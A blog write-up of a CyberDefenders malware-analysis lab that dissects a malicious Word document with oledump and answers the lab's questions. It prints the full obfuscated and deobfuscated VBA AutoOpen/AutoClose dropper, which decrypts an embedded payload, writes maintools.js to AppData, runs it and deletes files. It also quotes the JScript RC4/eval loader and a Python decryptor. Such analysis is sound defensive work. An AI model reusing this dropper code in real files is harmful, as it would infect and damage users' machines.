---
layout: post
title: "[CyberDefenders] Obfuscated Lab - Multi-stage Malware Analysis"
date: 2025-09-18 23:12 +0530
categories: [CyberDefenders, CTF]
tags: [VBA, JavaScript, malware, oledump, CyberChef, WSH, IOCs, deobfuscation, analysis]
pin: false
---

### Scenario
While working as a SOC analyst, you may encounter alerts from the enterprise Endpoint Detection and Response (EDR) system regarding unusual activity on an end-user machine. In one instance, a user reported receiving an email containing a DOC file from an unknown sender. The user subsequently submitted the document for analysis to ensure it does not pose a security risk.

### Q1) What is the SHA256 hash of the **DOC** file?
First I'll ensure the file type, just to be sure
```bash
file 49b367ac261a722a7c2bbbc328c32545
```

output:
<br>
``
49b367ac261a722a7c2bbbc328c32545: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: user, Template: Normal.dotm, Last Saved By: John, Revision Number: 11, Name of Creating Application: Microsoft Office Word, Total Editing Time: 08:00, Create Time/Date: Fri Nov 25 19:04:00 2016, Last Saved Time/Date: Fri Nov 25 20:04:00 2016, Number of Pages: 1, Number of Words: 320, Number of Characters: 1828, Security: 0
``

To calculate the SHA256 hash Use the command:-
```bash
sha256sum 49b367ac261a722a7c2bbbc328c32545
```
File hash is: `ff2c8cadaa0fd8da6138cce6fce37e001f53a5d9ceccd67945b15ae273f4d751`

<br>
### Q2) Multiple streams contain macros in this document. Provide the number of the lowest one.
Let's use Oledump for this task

**What is Oledump?**

*"oledump.py is a program to analyze OLE files ([Compound File Binary Format](https://en.wikipedia.org/wiki/Compound_File_Binary_Format)) . These files contain streams of data. oledump allows you to analyze these streams.
Many applications use this file format, the best known is MS Office. .doc, .xls, .ppt, … are OLE files (docx, xlsx, … is the new file format: XML inside ZIP)."*
[(source) ](https://blog.didierstevens.com/programs/oledump-py/#:~:text=oledump.py%20is,XML%20inside%20ZIP)

Let's use oledump.py (this program must be run using python2, running with python3 will return syntax errors)

```bash
python2 oledump.py --dump /home/kali/Desktop/Obfuscated/temp_extract_dir/49b367ac261a722a7c2bbbc328c32545
```

Output:
```bash
  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17:     20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

Left-most column: Stream number of index to select a stream for further analysis
Middle-column: size of the stream in bytes
Right-most column: Name of the stream

\x01 and \x05 are non-printable characters in hexadecimal format.

We can see that stream 6 to stream 15 have Macros
i.e lowest stream number containing VBA macros as code is ``8`` as visible from the letter M to the left of the stream index.

<br>
### Q3) What is the decryption key of the obfuscated code?
Let's dig around a bit more using the oledump tool
found it just like that
```bash
python2 oledump.py -s 8 /home/kali/Desktop/Obfuscated/temp_extract_dir/49b367ac261a722a7c2bbbc328c32545 -v 
```

Using the above command
-s : used to select the specific stream index which we want to examine
-v : stands for vba decompression, will show us the intact VBA code

Output:
```vb
Attribute VB_Name = "Module1"
Public OBKHLrC3vEDjVL As String
Public B8qen2T433Ds1bW As String
Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
Dim THQNfU76nlSbtJ5nX8LY6 As Byte
THQNfU76nlSbtJ5nX8LY6 = 45
For i = 0 To M5wI32R3VF2g5B21EK4d - 1
EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
Next i
Q7JOhn5pIl648L6V43V = True
End Function
Sub AutoClose()
On Error Resume Next
Kill OBKHLrC3vEDjVL
On Error Resume Next
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub
Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim NEnrKxf8l511
Dim N18Eoi6OG6T2rNoVl41W As Long
Dim M5wI32R3VF2g5B21EK4d As Long
N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
NEnrKxf8l511 = FreeFile
Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511
Dim E2kvpmR17SI() As Byte
ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
Get #NEnrKxf8l511, 1, E2kvpmR17SI
Dim KqG31PcgwTc2oL47hjd7Oi As String
KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim VUy5oj112fLw51h6S
Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 16827
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
B8qen2T433Ds1bW = Environ("appdata")
End If
Set R7Ks7ug4hRR2weOy7 = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End Sub
```

The code was very hard to read so I spent a considerable amount of time to de-obfuscate it and make it much more readable.

```vb
Attribute VB_Name = "Module1"
Public payload_path As String
Public payload_dir  As String
Function xor_decoder(data() As Byte, length As Long) As Boolean
    Dim key As Byte
    key = 45
    For i = 0 To length - 1
        data(i) = data(i) Xor key
        key = ((key Xor 99) Xor (i Mod 254))
    Next i
    xor_decoder = TRUE
End Function
Sub AutoClose()
    On Error Resume Next
    Kill payload_path
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.DeleteFile payload_dir & "\*.*", TRUE
    Set fso = Nothing
End Sub

Sub AutoOpen()
    On Error GoTo cleanup
    Dim file_handle_id
    Dim file_size   As Long
    Dim length      As Long
    file_size = FileLen(ActiveDocument.FullName)
    file_handle_id= FreeFile
    Open (ActiveDocument.FullName) For Binary As #file_handle_id
    Dim doc_bytes() As Byte
    ReDim doc_bytes(file_size)
    Get #file_handle_id, 1, doc_bytes
    Dim doc_text    As String
    doc_text = StrConv(doc_bytes, vbUnicode)
    Dim regex_match, regex_match_count
    Dim regex_obj
    Set regex_obj= CreateObject("vbscript.regexp")
    regex_obj.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
    Set regex_match_count = regex_obj.Execute(doc_text)
    Dim marker_index
    If regex_match_count.Count = 0 Then
        GoTo cleanup
    End If
    For Each regex_match In regex_match_count
        marker_index = regex_match.FirstIndex
        Exit For
    Next
    Dim payload_bytes() As Byte
    Dim payload_len As Long
    payload_len= 16827
    ReDim payload_bytes(payload_len)
    Get #file_handle_id, marker_index + 81, payload_bytes
    If Not xor_decoder(payload_bytes(), payload_len+ 1) Then
        GoTo cleanup
    End If
    payload_dir = Environ("appdata") & "\Microsoft\Windows"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(payload_dir) Then
        payload_dir = Environ("appdata")
    End If
    Set fso = Nothing
    Dim payload_file_handle
    payload_file_handle= FreeFile
    payload_path = payload_dir & "\" & "maintools.js"
    Open (payload_path) For Binary As #payload_file_handle
    Put #payload_file_handle, 1, payload_bytes
    Close #payload_file_handle
    Erase payload_bytes
    Set shell_obj = CreateObject("WScript.Shell")
    shell_obj.Run """" + payload_path + """" + " EzZETcSXyKAdF_e5I2i1"
    ActiveDocument.Save
    Exit Sub
    cleanup:
    Close #payload_file_handle
    ActiveDocument.Save
End Sub
```

Let's understand what the VBA macro is doing:-
1. The macro reads the entire Word document as raw bytes.
2. It converts the bytes to a Unicode string so it can search for a specific marker:
``MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh.``
3. It finds the position of this marker in the document.
4. Starting **81 bytes after the marker**, it extracts **16,827 bytes**, this is the encrypted payload.
5. It decrypts the payload using a custom **XOR** routine where the key evolves with each byte.
6. It writes the decrypted payload as **maintools.js** in the user’s AppData folder.
7. The macro runs the payload automatically with some command-line arguments.
8. Finally, it cleans up any previous payloads and temporary files, both on opening and closing the document.

<br>

### Q4) What is the name of the dropped file?
After de-obfuscating the code, it's visible that ``maintools.js`` is the dropped payload.
Environ("appdata") gets the user's appdata part 
eg. ``C:\Users\<username>\AppData\Roaming``
Also checks if ``\Microsoft\Windows`` exists which makes the full path:
``C:\Users\<username>\AppData\Roaming\Microsoft\Windows\maintools.js``
or
``C:\Users\<username>\AppData\Roaming\maintools.js`` if not.

### Q5) This script uses what language?
So the name ``maintools.js`` tells us at this is a JavaScript like language.
The VBA macro drops this file in %appdata% which means that the script is intended to be executed locally and not on any browser.
A .js files defaults to being run by Windows Script Host (WSH) and WSH doesn't use browser engines it uses ``JScript`` which is a Microsoft implementation of the ECMAScript.

### Q6) What is the name of the variable that is assigned the command-line arguments?
Our goal is to extract the encrypted payload and then decrypt it to retrieve maintools.js
To retrieve the dropped file we'll use an online sandbox to run the file, we cannot rely on static analysis anymore.
We'll use [Hybrid Analysis](https://hybrid-analysis.com/) platform for dynamic analysis in a sandboxed environment.
After retrieving the JScript content in maintools.js and beautifying it, we get this :-
**The first 10 lines**
```js
try {
    var wvy1 = WScript.Arguments;
    var ssWZ = wvy1(0);
    var ES3c = y3zb();
    ES3c = LXv5(ES3c);
    ES3c = CpPT(ssWZ, ES3c);
    eval(ES3c);
} catch (e) {
    WScript.Quit();
}
```
We can see that ``wvy1`` is the name of the variable that is assigned the command line arguments

### Q7) How many command-line arguments does this script expect?
The above script expects at least 1 command line argument.

### Q8) What instruction is executed if this script encounters an error?
The script executes WScript.Quit() which terminates the script with an exit code.

<br>

### Q9) What function returns the next stage of code (i.e. the first round of obfuscated code)?
The first round of code is called by the function ``y3zb`` 
The function appears as given below:-
```js
function y3zb() {
var qGxZ = "zAubgpaJR......"
return qGxZ;
}
```
where qGxZ is the obfuscated code being returned.

<br>

### Q10) The function **LXv5** is important, what variable is assigned a key string value in determining what this function does?
Looking at the code:-
```js
var LUK7 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
```
Hence LUK7 is the variable which has been assigned a string value in function LXv5.

<br>

### Q11) What encoding scheme is this function responsible for decoding?
```js
var ES3c = y3zb();
ES3c = LXv5(ES3c);
```
In this snippet we can observe that ``LXv5`` is being passed ``ES3c``, the value of ``ES3c`` is actually the value of the string stored in ``qGxZ`` which is being returned as evident from the function ``y3zb()`` .
```js
var qGxZ = "zAubgpaJR......+DwYnSVB4fKV010kDuEZ/C8wCcWglLQmhMPV8CS6oH/......SZWJKNJ5ZSbf06ZO4="
```
the string has the characters "+", "/" and ends with "=", which is a telltale sign that we are dealing with base64 encoding.

<br> 

### Q12) In the function **CpPT**, the first two **for()** loops are responsible for what important part of this function?
We can see that the function CpPT is being run with the first WScript argument i.e if we refer to the VB code again it is the decryption key i.e ``EzZETcSXyKAdF_e5I2i1`` which is ``bOe3`` 

```js
function CpPT(bOe3, F5vZ) {
	var AWy7 = [];
	var V2Vl = 0;
	var qyCq;
	var mjqo = '';
	for (var i = 0; i < 256; i++) {
		AWy7[i] = i;
	}

	for (var i = 0; i < 256; i++) {
		V2Vl = (V2Vl + AWy7[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;
		qyCq = AWy7[i];
		AWy7[i] = AWy7[V2Vl];
		AWy7[V2Vl] = qyCq;
		}
	......
}
```
Let's try to understand what the first two for loops are trying to do 
```js
for (var i = 0; i < 256; i++) {
	AWy7[i] = i;
}
```
The first loop is creating an array AWy7 containing the numbers 0,1,2,...,255.

```js
for (var i = 0; i < 256; i++) {
	V2Vl = (V2Vl + AWy7[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;
	qyCq = AWy7[i];
	AWy7[i] = AWy7[V2Vl];
	AWy7[V2Vl] = qyCq;
}
```
The second loop shuffles the AWy7 array using the key (bOe3) — this is the **key scheduling algorithm (KSA)** of RC4, which mixes the key into the state array to prepare it for encryption/decryption.

<br>

### Q13) The function CpPT requires two arguments, where does the value of the first argument come from?
The first argument of CpPT is ``bOe3`` which comes from the command- line argument.

<br>

### Q14) For the function **CpPT**, what does the first argument represent?
The first argument represents the key as we discussed in Q12.

<br>

### Q15) What encryption algorithm does the function **CpPT** implement in this script? 
RC4 algorithm is being implemented in this script.

<br>

### Q16) What function is responsible for executing the deobfuscated code?
As visible from the code the ``eval()`` function is used to execute the deobfuscated code.

<br> 

### Q17) What Windows Script Host program can be used to execute this script in command-line mode?
To execute this script in command line mode, we can use ``cscript.exe`` while ``wscript.exe`` is meant for GUI mode execution.

### Q18)  What is the name of the first function defined in the deobfuscated code?
We'll create a python script to deobfuscate the string blob.

```python 
import base64
key = "EzZETcSXyKAdF_e5I2i1"
base64blob = "zAub.......ZO4="

#Decoding the base64 blob first
data = base64.b64decode(base64blob)

#Replicating the Key-Scheduling Algorithm
S = list(range(256))
j = 0
key_bytes = [ord(c) for c in key]
for i in range(256):
	j = (j + S[i] + key_bytes[i % len(key_bytes)]) % 256
	S[i], S[j] = S[j], S[i]

# Pseudorandom generation algorithm
i = j = 0
out = []
for byte in data:
	i = (i + 1) % 256
	j = (j + S[i]) % 256
	S[i], S[j] = S[j], S[i]
	K = S[(S[i] + S[j]) % 256]
	out.append(byte ^ K)

# saving the code in another file
decoded_js = bytes(out).decode(errors="ignore")
with open("maintools_stage2.js", "w", encoding="utf-8", errors="ignore") as f:
	f.write(decoded_js)
```
After running the code above, we'll obtain maintools_stage2.js, which starts with ``function UspD(zDmy)...``